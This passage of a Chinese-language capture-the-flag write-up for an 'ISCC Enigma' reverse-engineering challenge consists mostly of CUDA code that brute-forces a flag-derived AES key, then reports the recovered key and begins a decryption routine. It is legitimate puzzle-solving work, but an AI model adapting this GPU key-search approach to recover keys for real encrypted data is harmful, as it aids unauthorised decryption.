</span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">*out++ = state[j][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">addRoundKey</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint32_t</span>* key)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> k[<span class="number">4</span>][<span class="number">4</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">k[i][j] = (<span class="type">uint8_t</span>)<span class="built_in">BYTE</span>(key[j], <span class="number">3</span> - i);</span><br><span class="line">state[i][j] ^= k[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">invSubBytes</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> LocalInvS[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">LocalInvS[i] = inv_S[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">state[i][j] = LocalInvS[state[i][j]];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">invShiftRows</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> temp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">temp[i][j] = state[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">state[<span class="number">0</span>][<span class="number">0</span>] = temp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">state[<span class="number">0</span>][<span class="number">1</span>] = temp[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">state[<span class="number">0</span>][<span class="number">2</span>] = temp[<span class="number">0</span>][<span class="number">2</span>];</span><br><span class="line">state[<span class="number">0</span>][<span class="number">3</span>] = temp[<span class="number">0</span>][<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">state[<span class="number">1</span>][<span class="number">0</span>] = temp[<span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">state[<span class="number">1</span>][<span class="number">1</span>] = temp[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">state[<span class="number">1</span>][<span class="number">2</span>] = temp[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">state[<span class="number">1</span>][<span class="number">3</span>] = temp[<span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">state[<span class="number">2</span>][<span class="number">0</span>] = temp[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line">state[<span class="number">2</span>][<span class="number">1</span>] = temp[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line">state[<span class="number">2</span>][<span class="number">2</span>] = temp[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line">state[<span class="number">2</span>][<span class="number">3</span>] = temp[<span class="number">2</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">state[<span class="number">3</span>][<span class="number">0</span>] = temp[<span class="number">3</span>][<span class="number">1</span>];</span><br><span class="line">state[<span class="number">3</span>][<span class="number">1</span>] = temp[<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">state[<span class="number">3</span>][<span class="number">2</span>] = temp[<span class="number">3</span>][<span class="number">3</span>];</span><br><span class="line">state[<span class="number">3</span>][<span class="number">3</span>] = temp[<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">uint8_t</span> <span class="title">GMul</span><span class="params">(<span class="type">uint8_t</span> u, <span class="type">uint8_t</span> v)</span> </span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> p = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span> (u &amp; <span class="number">0x01</span>) &#123;</span><br><span class="line">p ^= v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag = (v &amp; <span class="number">0x80</span>);</span><br><span class="line">v &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;</span><br><span class="line">v ^= <span class="number">0x1B</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">invMixColumns</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> M[<span class="number">4</span>][<span class="number">4</span>] = &#123; &#123;<span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>&#125;,</span><br><span class="line">   &#123;<span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>&#125;,</span><br><span class="line">   &#123;<span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>&#125;,</span><br><span class="line">   &#123;<span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>&#125; &#125;;</span><br><span class="line"><span class="type">uint8_t</span> tmp[<span class="number">4</span>][<span class="number">4</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">tmp[i][j] = state[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">state[i][j] =</span><br><span class="line"><span class="built_in">GMul</span>(M[i][<span class="number">0</span>], tmp[<span class="number">0</span>][j])</span><br><span class="line">^ <span class="built_in">GMul</span>(M[i][<span class="number">1</span>], tmp[<span class="number">1</span>][j])</span><br><span class="line">^ <span class="built_in">GMul</span>(M[i][<span class="number">2</span>], tmp[<span class="number">2</span>][j])</span><br><span class="line">^ <span class="built_in">GMul</span>(M[i][<span class="number">3</span>], tmp[<span class="number">3</span>][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">aesDecrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span>* ct, <span class="type">uint8_t</span>* pt, <span class="type">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> eK[<span class="number">44</span>]&#123;&#125;, dK[<span class="number">44</span>]&#123;&#125;;</span><br><span class="line"><span class="type">int</span> Nr;</span><br><span class="line">&#125;AesKey;</span><br><span class="line"></span><br><span class="line">AesKey aesKey;</span><br><span class="line"><span class="type">uint8_t</span>* pos = pt;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">keyExpansion</span>(key, <span class="number">16</span>, &amp;aesKey);</span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span>* rk = aesKey.dK;</span><br><span class="line"></span><br><span class="line"><span class="built_in">loadStateArray</span>(state, ct);</span><br><span class="line"><span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rk += <span class="number">4</span>;</span><br><span class="line"><span class="built_in">invShiftRows</span>(state);</span><br><span class="line"><span class="built_in">invSubBytes</span>(state);</span><br><span class="line"><span class="comment">// 解密同样交换addRoundKey和invMixColumns的调用顺序</span></span><br><span class="line"><span class="built_in">invMixColumns</span>(state);</span><br><span class="line"><span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">invSubBytes</span>(state);</span><br><span class="line"><span class="built_in">invShiftRows</span>(state);</span><br><span class="line"><span class="built_in">addRoundKey</span>(state, rk + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">storeStateArray</span>(state, pos);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _le64toh(x) ((uint64_t)(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTATE(x, b) (uint64_t)( ((x) <span class="string">&lt;&lt; (b)) | ( (x) &gt;</span>&gt; (64 - (b))) )</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_ROUND(a,b,c,d,s,t)\</span></span><br><span class="line"><span class="meta">a += b; c += d;\</span></span><br><span class="line"><span class="meta">b = ROTATE(b, s) ^ a;\</span></span><br><span class="line"><span class="meta">d = ROTATE(d, t) ^ c;\</span></span><br><span class="line"><span class="meta">a = ROTATE(a, 32);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DOUBLE_ROUND(v0,v1,v2,v3)\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);</span></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">uint64_t</span> <span class="title">siphash24_gpu</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* src, <span class="type">unsigned</span> <span class="type">long</span> src_sz, <span class="type">const</span> <span class="type">char</span> key[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* _key = (<span class="type">uint64_t</span>*)key;</span><br><span class="line"><span class="type">uint64_t</span> k0 = _le64toh(_key[<span class="number">0</span>]);</span><br><span class="line"><span class="type">uint64_t</span> k1 = _le64toh(_key[<span class="number">1</span>]);</span><br><span class="line"><span class="type">uint64_t</span> b = (<span class="type">uint64_t</span>)src_sz &lt;&lt; <span class="number">56</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* in = (<span class="type">uint64_t</span>*)src;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> v0 = k0 ^ <span class="number">0x102030405060708ULL</span>;</span><br><span class="line"><span class="type">uint64_t</span> v1 = k1 ^ <span class="number">0x90a0b0c0d0e0f00ULL</span>;</span><br><span class="line"><span class="type">uint64_t</span> v2 = k0 ^ k1 ^ <span class="number">0x123456789abcdefULL</span>;</span><br><span class="line"><span class="type">uint64_t</span> v3 = k1 ^ k0 ^ <span class="number">0x4953434343435349ULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (src_sz &gt;= <span class="number">8</span>) &#123;</span><br><span class="line"><span class="type">uint64_t</span> mi = _le64toh(*in);</span><br><span class="line">in += <span class="number">1</span>; src_sz -= <span class="number">8</span>;</span><br><span class="line">v3 ^= mi;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= mi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> t = <span class="number">0</span>; <span class="type">uint8_t</span>* pt = (<span class="type">uint8_t</span>*)&amp;t; <span class="type">uint8_t</span>* m = (<span class="type">uint8_t</span>*)in;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">6</span>] = m[<span class="number">6</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">5</span>] = m[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">4</span>] = m[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">*((<span class="type">uint32_t</span>*)&amp;pt[<span class="number">0</span>]) = *((<span class="type">uint32_t</span>*)&amp;m[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">2</span>] = m[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">1</span>] = m[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">0</span>] = m[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">b |= _le64toh(t);</span><br><span class="line"></span><br><span class="line">v3 ^= b;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= b; v2 ^= <span class="number">0xff</span>;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="keyword">return</span> (v0 ^ v1) ^ (v2 ^ v3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">crack</span><span class="params">(<span class="type">uint8_t</span>* KeyOut, <span class="type">bool</span>* found, <span class="type">uint64_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 是否找到</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">atomicOr</span>((<span class="type">int</span>*)found,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> tid = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tid &gt; <span class="number">94ULL</span> * <span class="number">95ULL</span> * <span class="number">0xffffULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> rndList[<span class="number">16</span>];</span><br><span class="line"><span class="type">uint8_t</span> hash_plaintext[<span class="number">9</span>];</span><br><span class="line"><span class="type">uint8_t</span> key[<span class="number">16</span>];</span><br><span class="line"><span class="type">uint8_t</span> out[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> CHAR_RANGE = <span class="number">95</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> BASE_CHAR = <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过tid生成当前数值</span></span><br><span class="line"><span class="type">int</span> rnd_v = tid % <span class="number">0xFFFF</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> char_pos = tid / <span class="number">0xFFFF</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> c3 = BASE_CHAR + (char_pos % CHAR_RANGE);</span><br><span class="line">char_pos /= CHAR_RANGE;</span><br><span class="line"><span class="type">int</span> c2 = BASE_CHAR + (char_pos % CHAR_RANGE);</span><br><span class="line">char_pos /= CHAR_RANGE;</span><br><span class="line"><span class="type">int</span> c1 = BASE_CHAR + offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (c1 &lt; <span class="number">127</span> &amp;&amp; c2 &lt; <span class="number">127</span> &amp;&amp; c3 &lt; <span class="number">127</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 生成01排列</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] = i + ((rnd_v &gt;&gt; (<span class="number">15</span> - i)) &amp; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">hash_plaintext[i] = hash_plaintext_template[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ISCC&#123;$c1$c2$c3&#125;</span></span><br><span class="line">hash_plaintext[<span class="number">5</span>] = c1;</span><br><span class="line">hash_plaintext[<span class="number">6</span>] = c2;</span><br><span class="line"></span><br><span class="line">hash_plaintext[<span class="number">7</span>] = c3;</span><br><span class="line"><span class="comment">// hash</span></span><br><span class="line"><span class="type">uint64_t</span> hash = <span class="built_in">siphash24_gpu</span>(hash_plaintext, <span class="number">9</span>, (<span class="type">const</span> <span class="type">char</span>*)rndList);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用hash扩展生成AES密钥</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">8</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">key[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">-8</span> + <span class="number">0x38</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// AES解密</span></span><br><span class="line"><span class="built_in">aesDecrypt</span>(key, <span class="number">16</span>, EncFlag, out, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span> (out[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span> &amp;&amp; out[<span class="number">1</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; out[<span class="number">2</span>] == <span class="string">&#x27;C&#x27;</span> &amp;&amp; out[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span> &amp;&amp; out[<span class="number">4</span>] == <span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">atomicExch</span>((<span class="type">int</span>*)found, <span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">KeyOut[i] = key[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> EncFlag_user[]&#123; <span class="number">0x9f</span>, <span class="number">0xb3</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x19</span>, <span class="number">0x7d</span>, <span class="number">0xe7</span>, <span class="number">0x2a</span>, <span class="number">0x8b</span>, <span class="number">0x20</span>, <span class="number">0x0c</span>, <span class="number">0x5b</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xa0</span>, <span class="number">0x63</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xc2</span>, <span class="number">0x51</span>, <span class="number">0xde</span>, <span class="number">0x86</span>, <span class="number">0x1b</span>, <span class="number">0x87</span>, <span class="number">0x2f</span>, <span class="number">0x31</span>, <span class="number">0x6b</span>, <span class="number">0xbc</span>, <span class="number">0xfa</span>, <span class="number">0x5b</span>, <span class="number">0x9a</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x8b</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x6c</span>, <span class="number">0x1d</span>, <span class="number">0x94</span>, <span class="number">0xba</span>, <span class="number">0x2f</span>, <span class="number">0x37</span> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">EncFlag_user[i] ^= <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(S, S_user, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(inv_S, inv_S_user, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(EncFlag, EncFlag_user, <span class="number">16</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(rcon, rcon_user, <span class="number">40</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpyToSymbol</span>(hash_plaintext_template, <span class="string">&quot;ISCC&#123;xxx&#125;&quot;</span>, <span class="number">9</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> resultKey[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"><span class="type">bool</span> found_ = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* KeyOut;</span><br><span class="line"><span class="type">bool</span>* found;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMalloc</span>(&amp;KeyOut, <span class="number">16</span> * <span class="built_in">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line"><span class="built_in">cudaMalloc</span>(&amp;found, <span class="number">1</span> * <span class="built_in">sizeof</span>(<span class="type">bool</span>));</span><br><span class="line"><span class="built_in">cudaMemset</span>(found, <span class="number">0</span>, <span class="built_in">sizeof</span>(<span class="type">bool</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个字节在用户层循环</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">94</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tring crack the block %d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span> TOTAL_COMBINATIONS = <span class="number">94ULL</span> * <span class="number">95ULL</span> * <span class="number">0xffffULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> blockSize = <span class="number">256</span>;</span><br><span class="line"><span class="type">uint64_t</span> gridSize = (TOTAL_COMBINATIONS + blockSize - <span class="number">1</span>) / blockSize;</span><br><span class="line">crack &lt;&lt; &lt;gridSize, blockSize &gt;&gt; &gt; (KeyOut, found,i);</span><br><span class="line"><span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">cudaMemcpy</span>(&amp;found_, found, <span class="number">1</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"><span class="keyword">if</span> (found_)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cudaMemcpy</span>(resultKey, KeyOut, <span class="number">16</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Found key: &quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, resultKey[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">cudaMemset</span>(found, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No result.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cudaFree</span>(KeyOut);</span><br><span class="line"><span class="built_in">cudaFree</span>(found);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="获得密钥解密"><a href="#获得密钥解密" class="headerlink" title="获得密钥解密"></a>获得密钥解密</h1><p>CUDA爆破得到密钥为：</p><blockquote><p>0x54,0x8e,0x7a,0x3a,0x13,0x57,0xf3,0x00,0x00,0x3a,0x00,0x7a,0x00,0x8e,0x00,0x54</p></blockquote><p><img src="/2025/05/25/ISCC-Enigma/image-18.png" alt="alt text"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> EncFlag[]&#123; <span class="number">0x9f</span>, <span class="number">0xb3</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x19</span>, <span class="number">0x7d</span>, <span class="number">0xe7</span>, <span class="number">0x2a</span>, <span class="number">0x8b</span>, <span class="number">0x20</span>, <span class="number">0x0c</span>, <span class="number">0x5b</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xa0</span>, <span class="number">0x63</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xc2</span>, <span class="number">0x51</span>, <span class="number">0xde</span>, <span 